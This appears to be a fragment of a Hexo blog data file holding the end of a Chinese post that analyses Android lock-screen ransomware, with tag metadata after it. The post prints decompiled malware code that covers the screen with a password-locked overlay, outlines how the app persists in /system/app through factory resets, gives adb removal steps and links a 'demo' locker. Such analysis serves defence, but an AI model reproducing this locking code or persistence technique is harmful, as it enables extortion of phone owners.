class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">c</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  WindowManager.LayoutParams localLayoutParams = <span class=\"keyword\">new</span> WindowManager.LayoutParams();</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams = localLayoutParams;</span><br><span class=\"line\">  Application localApplication = getApplication();</span><br><span class=\"line\">  getApplication();</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.mWindowManager = ((WindowManager)localApplication.getSystemService(Context.WINDOW_SERVICE));</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.type = <span class=\"number\">2010</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.format = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.flags = <span class=\"number\">1280</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.gravity = <span class=\"number\">49</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.x = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.y = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.width = -<span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.wmParams.height = -<span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.mFloatLayout = LayoutInflater.from(getApplication()).inflate(<span class=\"number\">2130903041</span>, (ViewGroup)<span class=\"keyword\">null</span>);</span><br><span class=\"line\">  MediaPlayer localMediaPlayer = MediaPlayer.create(<span class=\"keyword\">this</span>, <span class=\"number\">2131099648</span>);</span><br><span class=\"line\">  localMediaPlayer.setLooping(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">  localMediaPlayer.start();</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.mWindowManager.addView(<span class=\"keyword\">this</span>.mFloatLayout, <span class=\"keyword\">this</span>.wmParams);</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.bt = ((Button)<span class=\"keyword\">this</span>.mFloatLayout.findViewById(<span class=\"number\">2131361794</span>));</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.ed = ((EditText)<span class=\"keyword\">this</span>.mFloatLayout.findViewById(<span class=\"number\">2131361792</span>));</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.tv = ((TextView)<span class=\"keyword\">this</span>.mFloatLayout.findViewById(<span class=\"number\">2131361793</span>));</span><br><span class=\"line\">  <span class=\"keyword\">try</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.ed.setHint(<span class=\"string\">\"宝贝在这输入密码！\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.tv.append(<span class=\"string\">\"恭喜中奖\"</span>);</span><br><span class=\"line\">    Button localButton = <span class=\"keyword\">this</span>.bt;</span><br><span class=\"line\">    <span class=\"number\">100000001</span> local100000001 = <span class=\"keyword\">new</span> View.OnClickListener()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"meta\">@Override</span></span><br><span class=\"line\">      <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(View paramView)</span></span></span><br><span class=\"line\"><span class=\"function\">      </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (s.<span class=\"keyword\">this</span>.ed.getText().toString().equals(s.<span class=\"keyword\">this</span>.des.decrypt(s.<span class=\"keyword\">this</span>.share.getString(<span class=\"string\">\"passw\"</span>, <span class=\"string\">\"\"</span>))))</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            s.access$L1000001(s.<span class=\"keyword\">this</span>).removeView(s.access$L1000002(s.<span class=\"keyword\">this</span>));</span><br><span class=\"line\">            s.<span class=\"keyword\">this</span>.stopSelf();</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">catch</span> (Exception localException)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    localButton.setOnClickListener(local100000001);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">catch</span> (Exception localException1)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      TextView localTextView = <span class=\"keyword\">this</span>.tv;</span><br><span class=\"line\">      StringBuffer localStringBuffer1 = <span class=\"keyword\">new</span> StringBuffer();</span><br><span class=\"line\">      StringBuffer localStringBuffer2 = <span class=\"keyword\">new</span> StringBuffer();</span><br><span class=\"line\">      localTextView.append(localStringBuffer2.append(<span class=\"string\">\"\\n\"</span>).append(<span class=\"keyword\">this</span>.des.decrypt(<span class=\"string\">\"e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c\"</span>)).toString() + <span class=\"keyword\">this</span>.share.getLong(<span class=\"string\">\"m\"</span>, <span class=\"number\">0</span>));</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      localException1 = localException1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span> (Exception localException2)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>把一个布局文件全屏显示在屏幕中，以及设置组件的文字，大小，DES加密等。<br>重点：布局文件的type和flags属性。<br>可以让这个View一直显示在栈的顶端，任何其他view都会在这个view的下面，导致锁屏的假象。</p>\n</blockquote>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><blockquote>\n<p>这个锁机程序的运行流程，打开，把so文件改成apk文件防盗/system/app目录，重启，apk自启动，设置view到栈的顶端。<br>由于已经是系统应用了，所以双清、恢复出厂化设置都清除不了</p>\n</blockquote>\n<h2 id=\"解决办法。\"><a href=\"#解决办法。\" class=\"headerlink\" title=\"解决办法。\"></a>解决办法。</h2><blockquote>\n<p>手机必须是开启usb调试，连接电脑adb shell进入手机base shell，<br>进入/system/app目录，源码中的命令有说把该目录弄成可读可写，我们就借用那个命令，然后再把恶意app删掉即可rm -fr xx.apk，最后reboot重启。</p>\n</blockquote>\n<h2 id=\"末尾\"><a href=\"#末尾\" class=\"headerlink\" title=\"末尾\"></a>末尾</h2><blockquote>\n<p>为了不让恶意程序流传，我就不分享源程序了。<br>不过我写了一个锁屏的demo，仅仅打开后仅仅锁屏1分钟然后退出，并无其他恶意操作。<br>链接: <a href=\"http://pan.baidu.com/s/1mi0roJA\" target=\"_blank\" rel=\"noopener\">http://pan.baidu.com/s/1mi0roJA</a> 密码: 6xqi</p>\n</blockquote>"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cjvhjxaah0003iny2pbaq9y76","tag_id":"cjvhjxabb000yiny2phg3ebz2","_id":"cjvhjxac40029iny25cgfh878"},{"post_id":"cjvhjxaah0003iny2pbaq9y76","tag_id":"cjvhjxabg000ziny20t5igxxg","_id":"cjvhjxac4002biny28ajr3y9a"},{"post_id":"cjvhjxaai0004iny28rpgkslg","tag_id":"cjvhjxabh0010iny2qcdnajrk","_id":"cjvhjxac4002ciny24gz0poxe"},{"post_id":"cjvhjxaai0005iny2be8y93tc","tag_id":"cjvhjxabh0011iny2vd2zng64","_id":"cjvhjxac5002diny2jakndcdk"},{"post_id":"cjvhjxaai0005iny2be8y93tc","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac5002einy2bkbr695g"},{"post_id":"cjvhjxaaj0006iny2y7oxwejz","tag_id":"cjvhjxabb000yiny2phg3ebz2","_id":"cjvhjxac5002finy2wijrjp3j"},{"post_id":"cjvhjxaaj0006iny2y7oxwejz","tag_id":"cjvhjxabh0011iny2vd2zng64","_id":"cjvhjxac5002giny2nrxrmvsa"},{"post_id":"cjvhjxaak0007iny2sy0acj94","tag_id":"cjvhjxabh0011iny2vd2zng64","_id":"cjvhjxac5002hiny2nxzyb1ac"},{"post_id":"cjvhjxaak0007iny2sy0acj94","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac5002iiny2crjcwn4m"},{"post_id":"cjvhjxaak0008iny278y1xvkf","tag_id":"cjvhjxabb000yiny2phg3ebz2","_id":"cjvhjxac5002jiny2qsssqzzo"},{"post_id":"cjvhjxaak0008iny278y1xvkf","tag_id":"cjvhjxabk0018iny2srp5etac","_id":"cjvhjxac5002kiny2g02t2shf"},{"post_id":"cjvhjxaal0009iny2cfppurwm","tag_id":"cjvhjxabk0019iny2uzlxv4iv","_id":"cjvhjxac5002liny2a1jhs0ma"},{"post_id":"cjvhjxaal0009iny2cfppurwm","tag_id":"cjvhjxabb000yiny2phg3ebz2","_id":"cjvhjxac5002miny2posb7kzn"},{"post_id":"cjvhjxaan000ainy2sbi23f0g","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac5002niny2483znlqm"},{"post_id":"cjvhjxaao000biny22xj1s7l7","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac5002oiny2xp83ooso"},{"post_id":"cjvhjxaap000ciny2sk1qpl0o","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac5002piny2esoby58h"},{"post_id":"cjvhjxaap000ciny2sk1qpl0o","tag_id":"cjvhjxabh0011iny2vd2zng64","_id":"cjvhjxac5002qiny2pi9nhq56"},{"post_id":"cjvhjxaaq000diny2hd30kf7g","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac5002riny20oyt1ck5"},{"post_id":"cjvhjxaaq000einy29cxqh6xp","tag_id":"cjvhjxabn001giny2og0rau9l","_id":"cjvhjxac5002siny2tm9jvyyx"},{"post_id":"cjvhjxaar000finy2000sr0gl","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac5002tiny22zmjrta1"},{"post_id":"cjvhjxaar000giny2svz968kl","tag_id":"cjvhjxabn001giny2og0rau9l","_id":"cjvhjxac5002uiny25b0lkuki"},{"post_id":"cjvhjxaar000giny2svz968kl","tag_id":"cjvhjxabn001jiny2qg81cvqa","_id":"cjvhjxac5002viny2cl73qihv"},{"post_id":"cjvhjxaas000hiny2wuh0ljsi","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac5002winy2ugoifylr"},{"post_id":"cjvhjxaas000hiny2wuh0ljsi","tag_id":"cjvhjxabo001liny2yc3x4lj5","_id":"cjvhjxac5002xiny2hqd7yaxu"},{"post_id":"cjvhjxaat000iiny2ibmxzt0v","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac5002yiny2uq4io93r"},{"post_id":"cjvhjxaat000jiny2f9704m28","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac6002ziny2c17lis2p"},{"post_id":"cjvhjxaau000kiny2fw9rx0qe","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac60030iny2lso0m4t6"},{"post_id":"cjvhjxaaw000liny20ddm82v8","tag_id":"cjvhjxabk0019iny2uzlxv4iv","_id":"cjvhjxac60031iny2pf6xs6iw"},{"post_id":"cjvhjxaaw000liny20ddm82v8","tag_id":"cjvhjxabg000ziny20t5igxxg","_id":"cjvhjxac60032iny22vq03srh"},{"post_id":"cjvhjxaaw000liny20ddm82v8","tag_id":"cjvhjxabb000yiny2phg3ebz2","_id":"cjvhjxac60033iny2nqqrzrt7"},{"post_id":"cjvhjxaaw000miny2ao3imsr9","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac60034iny2x8stiz8d"},{"post_id":"cjvhjxaax000niny203x7rl2j","tag_id":"cjvhjxabr001tiny2s5ksx0le","_id":"cjvhjxac60035iny2waevqfdw"},{"post_id":"cjvhjxaay000oiny2xadkl00r","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac60036iny24q45351v"},{"post_id":"cjvhjxaay000oiny2xadkl00r","tag_id":"cjvhjxabh0011iny2vd2zng64","_id":"cjvhjxac60037iny2o2c7gbyu"},{"post_id":"cjvhjxaay000piny28mnj1vcl","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac60038iny2oy6emkuq"},{"post_id":"cjvhjxaay000piny28mnj1vcl","tag_id":"cjvhjxabo001liny2yc3x4lj5","_id":"cjvhjxac60039iny2036vzt8l"},{"post_id":"cjvhjxaaz000qiny2sh25d5o9","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac6003ainy25537i490"},{"post_id":"cjvhjxab0000riny253jwjnge","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac6003biny2t3hygokd"},{"post_id":"cjvhjxab0000siny2djr3kswn","tag_id":"cjvhjxabu0020iny2pgbpeczu","_id":"cjvhjxac6003ciny2h7203cxh"},{"post_id":"cjvhjxab0000siny2djr3kswn","tag_id":"cjvhjxabb000yiny2phg3ebz2","_id":"cjvhjxac6003diny2oa8gafhj"},{"post_id":"cjvhjxab1000tiny2r3rn89or","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac6003einy20ajfdsdb"},{"post_id":"cjvhjxab1000uiny2me1ozvxz","tag_id":"cjvhjxabk0019iny2uzlxv4iv","_id":"cjvhjxac6003finy2cg7nye1c"},{"post_id":"cjvhjxab1000viny2hqeu32uu","tag_id":"cjvhjxabh0012iny292f4rqfi","_id":"cjvhjxac6003giny2ppeokiwc"},{"post_id":"cjvhjxab1000viny2hqeu32uu","tag_id":"cjvhjxabv0025iny2hsdacydk","_id":"cjvhjxac6003hiny21gqkhyg1"},{"post_id":"cjvhjxab2000winy20ikrfsct","tag_id":"cjvhjxabk0019iny2uzlxv4iv","_id":"cjvhjxac6003iiny2ua93hrv6"},{"post_id":"cjvhjxab2000winy20ikrfsct","tag_id":"cjvhjxabg000ziny20t5igxxg","_id":"cjvhjxac6003jiny2su2eyrma"},{"post_id":"cjvhjxab2000winy20ikrfsct","tag_id":"cjvhjxabb000yiny2phg3ebz2","_id":"cjvhjxac6003kiny2lrd7ybar"},{"post_id":"cjvhjxaba000xiny2x49y7tds","tag_id":"cjvhjxabh0011iny2vd2zng64","_id":"cjvhjxac8003liny2fhlyuig4"},{"post_id":"cjvhjxaba000xiny2x49y7tds","tag_id":"cjvhjxac4002ainy2atqobo3y","_id":"cjvhjxac8003miny2z746jana"}],"Tag":[{"name":"开源","_id":"cjvhjxabb000yiny2phg3ebz2"},{"name":"NodeJs","_id":"cjvhjxabg000ziny20t5igxxg"},{"name":"hexo","_id":"cjvhjxabh0010iny2qcdnajrk"},{"name":"安卓","_id":"cjvhjxabh0011iny2vd2zng64"},{"name":"安全攻防","_id":"cjvhjxabh0012iny292f4rqfi"},{"name":"小程序","_id":"cjvhjxabk0018iny2srp5etac"},{"name":"React-Native","_id":"cjvhjxabk0019iny2uzlxv4iv"},{"name":"xposed","_id":"cjvhjxabn001giny2og0rau9l"},{"name":"破解","_id":"cjvhjxabn001jiny2qg81cvqa"},{"name":"wifi破解","_id":"cjvhjxabo001liny2yc3x4lj5"},{"name":"路由器","_id":"cjvhjxabr001tiny2s5ksx0le"},{"name":"React","_id":"cjvhjxabu0020iny2pgbpeczu"},{"name":"wifi","_id":"cjvhjxabv0025iny2hsdacydk"},{"name":"反编译","_id":"cjvhjxac4002ainy2atqobo3y"}]}}